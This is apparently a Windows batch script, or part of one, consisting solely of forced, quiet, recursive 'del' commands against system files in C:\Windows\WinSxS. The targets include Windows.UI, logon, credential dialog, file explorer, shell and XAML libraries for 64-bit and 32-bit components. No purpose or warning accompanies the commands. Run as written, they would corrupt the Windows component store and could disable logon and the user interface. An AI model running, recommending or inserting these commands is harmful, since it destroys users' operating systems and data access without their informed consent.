del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-cred-library_31bf3856ad364e35_10.0.22621.2506_none_9f29ab110e06bc1c\r\Windows.UI.Cred.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-cred-library_31bf3856ad364e35_10.0.22621.2506_none_9f29ab110e06bc1c\r\Windows.UI.Cred.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-fileexplorer-wasdk_31bf3856ad364e35_10.0.22621.2792_none_8bc301cff7ea5fd7\Windows.UI.FileExplorer.WASDK.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-fileexplorer-wasdk_31bf3856ad364e35_10.0.22621.2792_none_8bc301cff7ea5fd7\n\Windows.UI.FileExplorer.WASDK.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-fileexplorer_31bf3856ad364e35_10.0.22621.2792_none_66c262f616e1ff18\Windows.UI.FileExplorer.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-fileexplorer_31bf3856ad364e35_10.0.22621.2792_none_66c262f616e1ff18\f\Windows.UI.FileExplorer.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-fileexplorer_31bf3856ad364e35_10.0.22621.2792_none_66c262f616e1ff18\r\Windows.UI.FileExplorer.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-logon-library_31bf3856ad364e35_10.0.22621.2506_none_5d292d61c47d3419\Windows.UI.Logon.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-logon-library_31bf3856ad364e35_10.0.22621.2506_none_5d292d61c47d3419\Windows.UI.Logon.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-logon-library_31bf3856ad364e35_10.0.22621.2506_none_5d292d61c47d3419\f\Windows.UI.Logon.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-logon-library_31bf3856ad364e35_10.0.22621.2506_none_5d292d61c47d3419\f\Windows.UI.Logon.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-logon-library_31bf3856ad364e35_10.0.22621.2506_none_5d292d61c47d3419\r\Windows.UI.Logon.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-logon-library_31bf3856ad364e35_10.0.22621.2506_none_5d292d61c47d3419\r\Windows.UI.Logon.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-networkuxcontroller_31bf3856ad364e35_10.0.22621.2506_none_bf3cfb1b5174d0e9\Windows.UI.NetworkUXController.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-networkuxcontroller_31bf3856ad364e35_10.0.22621.2506_none_bf3cfb1b5174d0e9\f\Windows.UI.NetworkUXController.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-networkuxcontroller_31bf3856ad364e35_10.0.22621.2506_none_bf3cfb1b5174d0e9\r\Windows.UI.NetworkUXController.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-pcshell.resources_31bf3856ad364e35_10.0.22621.2506_en-us_36c82c63af13c34e\Windows.UI.PCShell.en-US.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-pcshell.resources_31bf3856ad364e35_10.0.22621.2506_en-us_36c82c63af13c34e\f\Windows.UI.PCShell.en-US.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-pcshell.resources_31bf3856ad364e35_10.0.22621.2506_en-us_36c82c63af13c34e\r\Windows.UI.PCShell.en-US.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-pcshell_31bf3856ad364e35_10.0.22621.2506_none_f47919e5326ec241\Windows.UI.PCShell.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-pcshell_31bf3856ad364e35_10.0.22621.2506_none_f47919e5326ec241\f\Windows.UI.PCShell.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-pcshell_31bf3856ad364e35_10.0.22621.2506_none_f47919e5326ec241\r\Windows.UI.PCShell.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-search.resources_31bf3856ad364e35_10.0.22621.2506_en-us_53839e6ae9c220a9\Windows.UI.Search.en-US.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-search_31bf3856ad364e35_10.0.22621.2506_none_d4eb9eca9ea17ee2\Windows.UI.Search.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-search_31bf3856ad364e35_10.0.22621.2506_none_d4eb9eca9ea17ee2\Windows.UI.Search.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-search_31bf3856ad364e35_10.0.22621.2506_none_d4eb9eca9ea17ee2\f\Windows.UI.Search.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-search_31bf3856ad364e35_10.0.22621.2506_none_d4eb9eca9ea17ee2\r\Windows.UI.Search.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-shell-component_31bf3856ad364e35_10.0.22621.2506_none_2d7be6f886278ad2\Windows.UI.Shell.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-shell-component_31bf3856ad364e35_10.0.22621.2506_none_2d7be6f886278ad2\Windows.UI.Shell.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-shell-component_31bf3856ad364e35_10.0.22621.2506_none_2d7be6f886278ad2\f\Windows.UI.Shell.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-shell-component_31bf3856ad364e35_10.0.22621.2506_none_2d7be6f886278ad2\r\Windows.UI.Shell.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-shell.resources_31bf3856ad364e35_10.0.22621.2506_en-us_902c5810061b8c5d\Windows.UI.Shell.en-US.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-shellcommon-desktop_31bf3856ad364e35_10.0.22621.3007_none_b47b6d8e2e44587f\Windows.UI.ShellCommon.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-shellcommon-desktop_31bf3856ad364e35_10.0.22621.3007_none_b47b6d8e2e44587f\f\Windows.UI.ShellCommon.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-shellcommon-desktop_31bf3856ad364e35_10.0.22621.3007_none_b47b6d8e2e44587f\r\Windows.UI.ShellCommon.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-shellcommoninetcore_31bf3856ad364e35_10.0.22621.2506_none_9b69ece04f913aaa\Windows.UI.ShellCommonInetCore.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-shellcommoninetcore_31bf3856ad364e35_10.0.22621.2506_none_9b69ece04f913aaa\f\Windows.UI.ShellCommonInetCore.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-shellcommoninetcore_31bf3856ad364e35_10.0.22621.2506_none_9b69ece04f913aaa\r\Windows.UI.ShellCommonInetCore.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-storage_31bf3856ad364e35_10.0.22621.2506_none_e5a060a9cdacb713\Windows.UI.Storage.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-storage_31bf3856ad364e35_10.0.22621.2506_none_e5a060a9cdacb713\f\Windows.UI.Storage.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-storage_31bf3856ad364e35_10.0.22621.2506_none_e5a060a9cdacb713\r\Windows.UI.Storage.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-controls_31bf3856ad364e35_10.0.22621.2506_none_f5b704df59c615b7\Windows.UI.Xaml.Controls.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-controls_31bf3856ad364e35_10.0.22621.2506_none_f5b704df59c615b7\f\Windows.UI.Xaml.Controls.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-controls_31bf3856ad364e35_10.0.22621.2506_none_f5b704df59c615b7\r\Windows.UI.Xaml.Controls.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-inkcontrols_31bf3856ad364e35_10.0.22621.2506_none_ae300763e04f821d\Windows.UI.Xaml.InkControls.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-inkcontrols_31bf3856ad364e35_10.0.22621.2506_none_ae300763e04f821d\f\Windows.UI.Xaml.InkControls.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-inkcontrols_31bf3856ad364e35_10.0.22621.2506_none_ae300763e04f821d\r\Windows.UI.Xaml.InkControls.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-maps.resources_31bf3856ad364e35_10.0.22621.1_en-us_a34843c4f40c8799\Windows.UI.Xaml.Maps.dll.mui" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-maps_31bf3856ad364e35_10.0.22621.2506_none_772812a545bd707a\Windows.UI.Xaml.Maps.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-maps_31bf3856ad364e35_10.0.22621.2506_none_772812a545bd707a\f\Windows.UI.Xaml.Maps.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-maps_31bf3856ad364e35_10.0.22621.2506_none_772812a545bd707a\r\Windows.UI.Xaml.Maps.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-phone_31bf3856ad364e35_10.0.22621.2506_none_b080ca702ba5ac7d\Windows.UI.Xaml.Phone.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-phone_31bf3856ad364e35_10.0.22621.2506_none_b080ca702ba5ac7d\f\Windows.UI.Xaml.Phone.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-ui-xaml-phone_31bf3856ad364e35_10.0.22621.2506_none_b080ca702ba5ac7d\r\Windows.UI.Xaml.Phone.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-w..immersive.resources_31bf3856ad364e35_10.0.22621.1_en-us_ebb4f7a537d3cc0c\Windows.UI.Immersive.dll.mui" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-w..indowsuiinputinking_31bf3856ad364e35_10.0.22621.2506_none_cf48f5365ec60bd3\Windows.UI.Input.Inking.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-w..indowsuiinputinking_31bf3856ad364e35_10.0.22621.2506_none_cf48f5365ec60bd3\f\Windows.UI.Input.Inking.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-w..indowsuiinputinking_31bf3856ad364e35_10.0.22621.2506_none_cf48f5365ec60bd3\r\Windows.UI.Input.Inking.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-w..putinking.resources_31bf3856ad364e35_10.0.22621.1_en-us_0f4d763dda2a0a70\Windows.UI.Input.Inking.dll.mui" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-windowsuiimmersive_31bf3856ad364e35_10.0.22621.2506_none_11aa38b84fa8c6d1\Windows.UI.Immersive.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-windowsuiimmersive_31bf3856ad364e35_10.0.22621.2506_none_11aa38b84fa8c6d1\Windows.UI.Immersive.dll.mun" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-windowsuiimmersive_31bf3856ad364e35_10.0.22621.2506_none_11aa38b84fa8c6d1\f\Windows.UI.Immersive.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-windowsuiimmersive_31bf3856ad364e35_10.0.22621.2506_none_11aa38b84fa8c6d1\f\Windows.UI.Immersive.dll.mun" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-windowsuiimmersive_31bf3856ad364e35_10.0.22621.2506_none_11aa38b84fa8c6d1\r\Windows.UI.Immersive.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-windowsuiimmersive_31bf3856ad364e35_10.0.22621.2506_none_11aa38b84fa8c6d1\r\Windows.UI.Immersive.dll.mun" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-windowui.resources_31bf3856ad364e35_10.0.22621.1_en-us_311dc6dfeedd4ea4\Windows.UI.dll.mui" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-windowui_31bf3856ad364e35_10.0.22621.2506_none_e7248d3d5f352b03\Windows.UI.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-windowui_31bf3856ad364e35_10.0.22621.2506_none_e7248d3d5f352b03\f\Windows.UI.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-windowui_31bf3856ad364e35_10.0.22621.2506_none_e7248d3d5f352b03\r\Windows.UI.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-xamlhost-library_31bf3856ad364e35_10.0.22621.2506_none_4fc099f70cad6205\Windows.UI.XamlHost.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-xamlhost-library_31bf3856ad364e35_10.0.22621.2506_none_4fc099f70cad6205\f\Windows.UI.XamlHost.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_microsoft-windows-xamlhost-library_31bf3856ad364e35_10.0.22621.2506_none_4fc099f70cad6205\r\Windows.UI.XamlHost.dll" /f /s /q
del "C:\Windows\WinSxS\amd64_systemresource-wind..-ui-accountscontrol_31bf3856ad364e35_10.0.22621.1_none_33aaad6b477ff550\Windows.UI.AccountsControl.pri" /f /s /q
del "C:\Windows\WinSxS\amd64_systemresource-wind..tscontrol.resources_31bf3856ad364e35_10.0.22621.2506_en-us_49f7e5f780ab82cb\Windows.UI.AccountsControl.en-US.pri" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-onecore-a..sibility-experience_31bf3856ad364e35_10.0.22621.2506_none_75f0813a36133fbb\Windows.UI.Accessibility.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-onecore-a..sibility-experience_31bf3856ad364e35_10.0.22621.2506_none_75f0813a36133fbb\f\Windows.UI.Accessibility.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-onecore-a..sibility-experience_31bf3856ad364e35_10.0.22621.2506_none_75f0813a36133fbb\r\Windows.UI.Accessibility.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-creddialogcontroller_31bf3856ad364e35_10.0.22621.2506_none_1733d97913493d48\Windows.UI.CredDialogController.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-creddialogcontroller_31bf3856ad364e35_10.0.22621.2506_none_1733d97913493d48\f\Windows.UI.CredDialogController.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-creddialogcontroller_31bf3856ad364e35_10.0.22621.2506_none_1733d97913493d48\r\Windows.UI.CredDialogController.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-directui_31bf3856ad364e35_10.0.22621.3007_none_a15afe509e6dd482\Windows.UI.Xaml.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-directui_31bf3856ad364e35_10.0.22621.3007_none_a15afe509e6dd482\f\Windows.UI.Xaml.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-directui_31bf3856ad364e35_10.0.22621.3007_none_a15afe509e6dd482\r\Windows.UI.Xaml.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-inputservice_31bf3856ad364e35_10.0.22621.2792_none_a40c9f1ce9926544\Windows.UI.Core.TextInput.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-inputservice_31bf3856ad364e35_10.0.22621.2792_none_a40c9f1ce9926544\f\Windows.UI.Core.TextInput.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-inputservice_31bf3856ad364e35_10.0.22621.2792_none_a40c9f1ce9926544\r\Windows.UI.Core.TextInput.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.2792_none_1b150919b7e1e52f\Windows.UI.winmd" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.2792_none_1b150919b7e1e52f\Windows.UI.Xaml.winmd" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.2792_none_1b150919b7e1e52f\f\Windows.UI.winmd" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.2792_none_1b150919b7e1e52f\f\Windows.UI.Xaml.winmd" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.2792_none_1b150919b7e1e52f\r\Windows.UI.winmd" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.2792_none_1b150919b7e1e52f\r\Windows.UI.Xaml.winmd" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-s..ink-inkanalysiscore_31bf3856ad364e35_10.0.22621.1_none_b4d146a6237f2ed1\Windows.UI.Input.Inking.Analysis.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-ui-cred-library_31bf3856ad364e35_10.0.22621.2506_none_a97e556342677e17\Windows.UI.Cred.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-ui-cred-library_31bf3856ad364e35_10.0.22621.2506_none_a97e556342677e17\f\Windows.UI.Cred.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-ui-cred-library_31bf3856ad364e35_10.0.22621.2506_none_a97e556342677e17\r\Windows.UI.Cred.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-ui-fileexplorer-wasdk_31bf3856ad364e35_10.0.22621.3007_none_9659e8fa2c1af778\Windows.UI.FileExplorer.WASDK.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-ui-fileexplorer-wasdk_31bf3856ad364e35_10.0.22621.3007_none_9659e8fa2c1af778\n\Windows.UI.FileExplorer.WASDK.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-ui-fileexplorer_31bf3856ad364e35_10.0.22621.3007_none_71594a204b1296b9\Windows.UI.FileExplorer.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-ui-fileexplorer_31bf3856ad364e35_10.0.22621.3007_none_71594a204b1296b9\f\Windows.UI.FileExplorer.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-ui-fileexplorer_31bf3856ad364e35_10.0.22621.3007_none_71594a204b1296b9\r\Windows.UI.FileExplorer.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-ui-search_31bf3856ad364e35_10.0.22621.2506_none_df40491cd30240dd\Windows.UI.Search.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-ui-search_31bf3856ad364e35_10.0.22621.2506_none_df40491cd30240dd\f\Windows.UI.Search.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-ui-search_31bf3856ad364e35_10.0.22621.2506_none_df40491cd30240dd\r\Windows.UI.Search.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-ui-xaml-controls_31bf3856ad364e35_10.0.22621.2506_none_000baf318e26d7b2\Windows.UI.Xaml.Controls.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-ui-xaml-controls_31bf3856ad364e35_10.0.22621.2506_none_000baf318e26d7b2\f\Windows.UI.Xaml.Controls.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-ui-xaml-controls_31bf3856ad364e35_10.0.22621.2506_none_000baf318e26d7b2\r\Windows.UI.Xaml.Controls.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-ui-xaml-inkcontrols_31bf3856ad364e35_10.0.22621.2506_none_b884b1b614b04418\Windows.UI.Xaml.InkControls.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-ui-xaml-inkcontrols_31bf3856ad364e35_10.0.22621.2506_none_b884b1b614b04418\f\Windows.UI.Xaml.InkControls.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-ui-xaml-inkcontrols_31bf3856ad364e35_10.0.22621.2506_none_b884b1b614b04418\r\Windows.UI.Xaml.InkControls.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-ui-xaml-maps_31bf3856ad364e35_10.0.22621.2506_none_817cbcf77a1e3275\Windows.UI.Xaml.Maps.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-ui-xaml-maps_31bf3856ad364e35_10.0.22621.2506_none_817cbcf77a1e3275\f\Windows.UI.Xaml.Maps.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-ui-xaml-maps_31bf3856ad364e35_10.0.22621.2506_none_817cbcf77a1e3275\r\Windows.UI.Xaml.Maps.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-ui-xaml-phone_31bf3856ad364e35_10.0.22621.2506_none_bad574c260066e78\Windows.UI.Xaml.Phone.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-ui-xaml-phone_31bf3856ad364e35_10.0.22621.2506_none_bad574c260066e78\f\Windows.UI.Xaml.Phone.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-ui-xaml-phone_31bf3856ad364e35_10.0.22621.2506_none_bad574c260066e78\r\Windows.UI.Xaml.Phone.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-w..indowsuiinputinking_31bf3856ad364e35_10.0.22621.2506_none_d99d9f889326cdce\Windows.UI.Input.Inking.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-w..indowsuiinputinking_31bf3856ad364e35_10.0.22621.2506_none_d99d9f889326cdce\f\Windows.UI.Input.Inking.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-w..indowsuiinputinking_31bf3856ad364e35_10.0.22621.2506_none_d99d9f889326cdce\r\Windows.UI.Input.Inking.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-w..putinking.resources_31bf3856ad364e35_10.0.22621.1_en-us_19a220900e8acc6b\Windows.UI.Input.Inking.dll.mui" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-windowsuiimmersive_31bf3856ad364e35_10.0.22621.2506_none_1bfee30a840988cc\Windows.UI.Immersive.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-windowsuiimmersive_31bf3856ad364e35_10.0.22621.2506_none_1bfee30a840988cc\f\Windows.UI.Immersive.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-windowsuiimmersive_31bf3856ad364e35_10.0.22621.2506_none_1bfee30a840988cc\r\Windows.UI.Immersive.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-windowui_31bf3856ad364e35_10.0.22621.2506_none_f179378f9395ecfe\Windows.UI.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-windowui_31bf3856ad364e35_10.0.22621.2506_none_f179378f9395ecfe\f\Windows.UI.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-windowui_31bf3856ad364e35_10.0.22621.2506_none_f179378f9395ecfe\r\Windows.UI.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-xamlhost-library_31bf3856ad364e35_10.0.22621.2506_none_5a154449410e2400\Windows.UI.XamlHost.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-xamlhost-library_31bf3856ad364e35_10.0.22621.2506_none_5a154449410e2400\f\Windows.UI.XamlHost.dll" /f /s /q
del "C:\Windows\WinSxS\wow64_microsoft-windows-xamlhost-library_31bf3856ad364e35_10.0.22621.2506_none_5a154449410e2400\r\Windows.UI.XamlHost.dll" /f /s /q
